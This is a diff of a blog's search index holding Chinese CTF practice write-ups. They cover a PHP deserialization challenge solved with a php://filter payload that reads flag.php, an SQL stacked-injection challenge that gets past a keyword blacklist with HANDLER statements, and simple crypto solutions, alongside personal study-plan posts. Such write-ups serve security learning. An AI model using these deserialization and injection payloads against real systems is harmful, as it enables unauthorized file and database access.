@@ -1,119 +1,140 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
-    <url>/2021/11/11/1/</url>
-    <content><![CDATA[<blockquote>
-<p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p>
-</blockquote>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>代码审计题，先看传入的参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>必须要通过is_valid函数才能够反序列化，那我们再看is_valid函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里规定了字符串的每个字符的ASCII码范围都应该在32-125之间</p>
-<p>我们现在去看反序列化，执行__destruct()函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果op赋值字符串2会被更改</p>
-<p>再看process函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>$this-&gt;op == “2”是个弱类型比较，可以通过给op赋值数字2的方法绕过</p>
-<p>再看read函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>题目中包含了flag.php，因此我们可以使用php伪协议</p>
-<p>构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	protected $op = 2;</span><br><span class="line">	protected $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	protected $content = &quot;Hello World!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;s:12:&quot;Hello World!&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>生成后发现一个问题，*的ascii码值不在32-125之间，更改一下属性为public</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	public $op = 2;</span><br><span class="line">	public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	public $content = &quot;Hello World!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;s:12:%22Hello%20World!%22;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>传入参数得到回显，base64解码即可得到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Result]:</span><br><span class="line">PD9waHAgJGZsYWc9J2ZsYWd7OTEzZWM1NTAtYzI3Yi00OTQ5LWE3ZWEtZmE5MmU4MjE3MDAwfSc7Cg==</span><br></pre></td></tr></table></figure>
-
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>BUUCTF【Crypto】1~12题</title>
+      <link href="/2021/11/14/BUUCTF%E3%80%90Crypto%E3%80%911-12%E9%A2%98/"/>
+      <url>/2021/11/14/BUUCTF%E3%80%90Crypto%E3%80%911-12%E9%A2%98/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p><p>解出数从高到低排序</p></blockquote><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>MD5碰撞：<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><h3 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h3><p>base64解码：<a href="https://base64.us/">https://base64.us/</a></p><h3 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h3><p>url解码：<a href="https://www.bejson.com/enc/urlencode/">https://www.bejson.com/enc/urlencode/</a></p><h3 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h3><p>凯撒密码解码：<a href="http://www.metools.info/code/c70.html">http://www.metools.info/code/c70.html</a></p><h3 id="摩丝"><a href="#摩丝" class="headerlink" title="摩丝"></a>摩丝</h3><p>摩斯电码解码：<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx?d=123">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx?d=123</a></p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>根据题目提示，密码为姓名加日期：zs19900315</p><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afZ_r9VYfScOeO_UL^RWUc</span><br></pre></td></tr></table></figure><p>将前四个字母对照<code>flag</code>可以发现，分别移了5，6，7，8位，因此用python脚本解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secret = &quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span><br><span class="line">cnt = 5</span><br><span class="line">for i in secret:</span><br><span class="line">    print(chr(ord(i)+cnt), end=&quot;&quot;)</span><br><span class="line">    cnt += 1</span><br></pre></td></tr></table></figure><h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><p>Quoted-printable解码：<a href="http://web.chacuo.net/charsetquotedprintable/">http://web.chacuo.net/charsetquotedprintable/</a></p><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><p>在线Rabbit算法加密解密：<a href="http://www.jsons.cn/rabbitencrypt/">http://www.jsons.cn/rabbitencrypt/</a></p><h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>观察即可发现，偶数位0、2、4、6构成了<code>flag</code>，用python脚本解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">secret = &quot;felhaagv&#123;ewtehtehfilnakgw&#125;&quot;</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">cnt = 0</span><br><span class="line">for i in secret:</span><br><span class="line">    if(cnt % 2 == 0):</span><br><span class="line">        print(i,end=&quot;&quot;)</span><br><span class="line">        res += i</span><br><span class="line">    cnt += 1</span><br><span class="line"># flag&#123;wethinkw</span><br></pre></td></tr></table></figure><p>只拿到了一半flag，继续观察剩下的密文，修改代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">secret = &quot;felhaagv&#123;ewtehtehfilnakgw&#125;&quot;</span><br><span class="line">res_1 = &quot;&quot;</span><br><span class="line">res_2 = &quot;&quot;</span><br><span class="line">cnt = 0</span><br><span class="line">for i in secret:</span><br><span class="line">    if(cnt % 2 == 0):</span><br><span class="line">        res_1 += i</span><br><span class="line">    else:</span><br><span class="line">        res_2 += i</span><br><span class="line">    cnt += 1</span><br><span class="line">print(res_1+res_2)</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</span><br><span class="line">求解出d作为flga提交</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.csdn.net/ISHobbyst/article/details/108918079">https://blog.csdn.net/ISHobbyst/article/details/108918079</a></p><p>加密过程</p><p>n=p*q</p><p>c=m^e mod n</p><p>c=pow(m,e,n)</p><p>解密过程</p><p>m=c^d mod n</p><p>m=pow(c,d,n)</p><p>求解私钥d</p><p>d = gmpy2.invert(e, (p-1)*(q-1))</p><p>一般来说，n，e是公开的，但是由于n一般是两个大素数的乘积，所以我们很难求解出d，所以RSA加密就是利用现代无法快速实现大素数的分解，所存在的一种安全的非对称加密。</p></blockquote><p>用python脚本解出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 473398607161</span><br><span class="line">q = 4511491</span><br><span class="line">e = 17</span><br><span class="line">s = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,s)</span><br><span class="line">print (&quot;dec: &quot; + str(d))</span><br></pre></td></tr></table></figure><h3 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import hashlib   </span><br><span class="line">for i in range(32,127):</span><br><span class="line">    for j in range(32,127):</span><br><span class="line">        for k in range(32,127):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;)</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            if &#x27;e9032&#x27; in des and &#x27;da&#x27; in des and &#x27;911513&#x27; in des:</span><br><span class="line">                print(des)</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;C:/Windows/Temp/360zip$Temp/360$3/md5.py&quot;, line 6, in &lt;module&gt;</span><br><span class="line">    m.update(&#x27;TASC&#x27;+chr(i)+&#x27;O3RJMV&#x27;+chr(j)+&#x27;WDJKX&#x27;+chr(k)+&#x27;ZM&#x27;)</span><br><span class="line">TypeError: Unicode-objects must be encoded before hashing</span><br></pre></td></tr></table></figure><p>修改python代码，得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.update(&#x27;TASC&#x27;.encode(&#x27;utf-8&#x27;)+chr(i).encode(&#x27;utf-8&#x27;)+&#x27;O3RJMV&#x27;.encode(&#x27;utf-8&#x27;)+chr(j).encode(&#x27;utf-8&#x27;)+&#x27;WDJKX&#x27;.encode(&#x27;utf-8&#x27;)+chr(k).encode(&#x27;utf-8&#x27;)+&#x27;ZM&#x27;.encode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>CTF日常练习</category>
+          
+          <category> CTF日常练习 </category>
+          
       </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>11月学习计划</title>
-    <url>/2021/11/05/11%E6%9C%88%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<p>从去年开始接触安全，到现在，很多东西仍然是一知半解。</p>
-<p>之前的学习方式也有些 “面向笔记学习“ 的感觉，”做了笔记就说明我学了“，这样的想法未免可笑。</p>
-<p>既然想要做渗透，精通python才能不沦为“脚本小子”；后端开发也是我本学期要自学的，否则在团队里真的无作用了。</p>
-<p>本月目标：</p>
-<ul>
-<li>《Python基础教程》</li>
-<li>《Java核心技术卷一》</li>
-</ul>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Crypto </tag>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
+      <link href="/2021/11/11/1/"/>
+      <url>/2021/11/11/1/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>代码审计题，先看传入的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须要通过is_valid函数才能够反序列化，那我们再看is_valid函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里规定了字符串的每个字符的ASCII码范围都应该在32-125之间</p><p>我们现在去看反序列化，执行__destruct()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果op赋值字符串2会被更改</p><p>再看process函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;op == “2”是个弱类型比较，可以通过给op赋值数字2的方法绕过</p><p>再看read函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>题目中包含了flag.php，因此我们可以使用php伪协议</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">protected $op = 2;</span><br><span class="line">protected $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">protected $content = &quot;Hello World!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;s:12:&quot;Hello World!&quot;;&#125;</span><br></pre></td></tr></table></figure><p>生成后发现一个问题，*的ascii码值不在32-125之间，更改一下属性为public</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">public $op = 2;</span><br><span class="line">public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">public $content = &quot;Hello World!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new FileHandler();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;s:12:%22Hello%20World!%22;&#125;</span><br></pre></td></tr></table></figure><p>传入参数得到回显，base64解码即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Result]:</span><br><span class="line">PD9waHAgJGZsYWc9J2ZsYWd7OTEzZWM1NTAtYzI3Yi00OTQ5LWE3ZWEtZmE5MmU4MjE3MDAwfSc7Cg==</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>生活</category>
+          
+          <category> CTF日常练习 </category>
+          
       </categories>
-      <tags>
-        <tag>规划</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[GYCTF2020]Blacklist</title>
-    <url>/2021/11/10/GYCTF2020/</url>
-    <content><![CDATA[<blockquote>
-<p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p>
-</blockquote>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>很显然是sql注入，打开页面后回显</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>用一些常用的命令看看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;%23</span><br><span class="line">1&#x27;;show tables;%23</span><br><span class="line">select</span><br></pre></td></tr></table></figure>
-
-<p>得到两个有用的信息：</p>
-<ol>
-<li><p>flag在FlagHere内</p>
-</li>
-<li><p>过滤了以下关键字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>但是没有过滤handler</p>
-<p>因此这里可以这样堆叠注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;%23</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HANDLER ... OPEN语句打开一个表，使其后续可以使用HANDLER ... READ语句访问。该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭</span><br></pre></td></tr></table></figure>
-
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[GYCTF2020]Blacklist</title>
+      <link href="/2021/11/10/GYCTF2020/"/>
+      <url>/2021/11/10/GYCTF2020/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>很显然是sql注入，打开页面后回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用一些常用的命令看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;%23</span><br><span class="line">1&#x27;;show tables;%23</span><br><span class="line">select</span><br></pre></td></tr></table></figure><p>得到两个有用的信息：</p><ol><li><p>flag在FlagHere内</p></li><li><p>过滤了以下关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure></li></ol><p>但是没有过滤handler</p><p>因此这里可以这样堆叠注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;%23</span><br></pre></td></tr></table></figure><h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER ... OPEN语句打开一个表，使其后续可以使用HANDLER ... READ语句访问。该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>CTF日常练习</category>
+          
+          <category> CTF日常练习 </category>
+          
       </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>sql注入</tag>
-        <tag>堆叠注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>新的起点</title>
-    <url>/2021/10/31/%E6%96%B0%E7%9A%84%E8%B5%B7%E7%82%B9/</url>
-    <content><![CDATA[<p>严格地说，这是我的第三个博客。</p>
-<p>第一个博客搭建在zsq大佬的服务器上，我基本没有操作；第二个博客搭建在阿里赠送的云服务器上，写了两篇文章后便置之不理。</p>
-<p>29日的秋期考核让我意识到我必须做出一些改变了。博客既是我成长的记录，也是我成长的辅助。今天，就是新的起点。</p>
-<p>不要做被世界改变的人，要做改变世界的人。    ——Derait·Buendia</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> Web </tag>
+            
+            <tag> sql注入 </tag>
+            
+            <tag> 堆叠注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>11月学习计划</title>
+      <link href="/2021/11/05/11%E6%9C%88%E5%AD%A6%E4%B9%A0/"/>
+      <url>/2021/11/05/11%E6%9C%88%E5%AD%A6%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<p>从去年开始接触安全，到现在，很多东西仍然是一知半解。</p><p>之前的学习方式也有些 “面向笔记学习“ 的感觉，”做了笔记就说明我学了“，这样的想法未免可笑。</p><p>既然想要做渗透，精通python才能不沦为“脚本小子”；后端开发也是我本学期要自学的，否则在团队里真的无作用了。</p><p>本月目标：</p><ul><li>《Python基础教程》</li><li>《Java核心技术卷一》</li></ul>]]></content>
+      
+      
       <categories>
-        <category>生活</category>
+          
+          <category> 生活 </category>
+          
       </categories>
-      <tags>
-        <tag>随记</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> 规划 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>新的起点</title>
+      <link href="/2021/10/31/%E6%96%B0%E7%9A%84%E8%B5%B7%E7%82%B9/"/>
+      <url>/2021/10/31/%E6%96%B0%E7%9A%84%E8%B5%B7%E7%82%B9/</url>
+      
+        <content type="html"><![CDATA[<p>严格地说，这是我的第三个博客。</p><p>第一个博客搭建在zsq大佬的服务器上，我基本没有操作；第二个博客搭建在阿里赠送的云服务器上，写了两篇文章后便置之不理。</p><p>29日的秋期考核让我意识到我必须做出一些改变了。博客既是我成长的记录，也是我成长的辅助。今天，就是新的起点。</p><p>不要做被世界改变的人，要做改变世界的人。    ——Derait·Buendia</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 生活 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
